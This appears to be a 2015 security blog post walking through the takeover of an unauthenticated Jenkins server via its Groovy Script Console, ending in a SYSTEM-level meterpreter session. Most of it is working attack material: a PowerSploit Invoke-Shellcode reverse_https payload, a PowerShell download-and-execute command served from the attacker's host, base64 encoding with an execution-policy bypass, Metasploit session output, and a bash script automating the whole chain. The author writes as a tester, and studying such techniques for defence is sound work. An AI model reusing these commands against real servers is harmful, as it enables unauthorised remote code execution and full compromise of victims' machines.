---
categories:
- powershell
- meterpreter
- jenkins
- command execution
comments: true
date: 2015-05-27T20:40:40Z
title: jenkins to meterpreter toying with powersploit
---

{{< figure src="/images/jenkins_logo.png" >}}

Recently I came across a few [Jenkins](https://jenkins-ci.org/) continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be *'secure'*. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
<!--more-->

## groooooooovy
At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the *Script Console* that Jenkins provides:

{{< figure src="/images/jenkins_script_console.png" >}}

This looked promising. *'Type in an arbitrary Groovy script and execute it on the server.'* I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the [documentation](http://www.groovy-lang.org/groovy-dev-kit.html#process-management).

```text
def process = "ls -l".execute()
println "Found text ${process.text}"
```

The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!

{{< figure src="/images/jenkins_console_command_exec.png" >}}

Nice and easy command execution! :D

## interactive shell, power shell
Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and moving on from there. On Windows based environments though, the builtin `cmd.exe` definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.

The one Jenkins machine that I had found was running on Windows as `nt authority\system`, which of course was *great* news! I figured though that in order to get a meterpreter shell, I'd have to approach this in some conventional way. Either obtaining credentials somehow and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. Some investigations showed though that the AV on the box was killing the meterpreter.exe on the box so that option was out as well. So, next on the list? I could just make use of `Invoke-Shellcode.ps1` from [PowerSploit](https://github.com/mattifestation/PowerSploit) to download and execute one using one command.

Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.

In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A `payload` which includes the `Invoke-Shellcode.ps1` powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don't worry it should be more clear after we have gone through it.

## preparing the payload
As already mentioned, I was going to use `Invoke-Shellcode.ps1` from [PowerSploit](https://github.com/mattifestation/PowerSploit). This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about *payload* here, all it really is is a file that will be made available via HTTP for the powershell script to download.

The payload will consist of 2 parts. First, defining `function Invoke-Shellcode {}`, and then invoking the function for a `windows/meterpreter/reverse_https` shell. Kali Linux has powersploit available in `/usr/share` so all I really did was cat it to my `payload` file:

```bash
$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 > payload
```

After that, I added the following line to the `payload` file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:

```bash
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
```

This file was finally served via HTTP using the python SimpleHTTPServer with `python -m SimpleHTTPServer` which meant that it would be available at http://192.168.252.1:8000/payload.

## preparing the command
Next, we need to prepare the actual command to run. We will make use of the powershell [Invoke-Expression](https://technet.microsoft.com/en-us/library/hh849893.aspx) command and give it a [Net.WebClient.DownloadString](https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx) object to download the payload we previously prepared and execute it.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')
```

That whole command needs to be [encoded](http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx) so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.

```bash
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
```

The above will output a base64 encoded string that should be passed to the Powershell `-Enc` flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing `-Exec ByPass` to the powershell executable. So, in summary, the command will be as follows:

```powershell
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
```

## pwn
So, I now had the `payload` file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!

{{< figure src="/images/jenkins_powershell_payload.png" >}}

From the python web server we can see the request come in for the payload:

```text
192.168.252.100 - - [28/May/2015 12:37:15] "GET /payload HTTP/1.1" 200 -
```

And pop!

```bash
msf exploit(handler) > exploit

[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.252.100:54023 Request received for /INITM...
[*] 192.168.252.100:54023 Staging connection for target /INITM received...
[*] Meterpreter session 1 opened (192.168.252.1:443 -> 192.168.252.100:54023) at 2015-05-28 12:37:17 +0200

meterpreter >
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## automation
While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:

```bash
#!/bin/bash

# meterpreter ip & port
lhost=192.168.252.1
lport=443

echo " * Writing Payload"
cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 > payload
echo "Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force" >> payload

echo " * Prepping Command"
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$lhost:8000/payload')"
echo $scriptblock

echo
echo " * Encoding command"
encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
echo $encode

command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
echo
echo " * Final command"
echo $command

echo
echo " * Starting HTTP Server to serve payload"
python -m SimpleHTTPServer
```
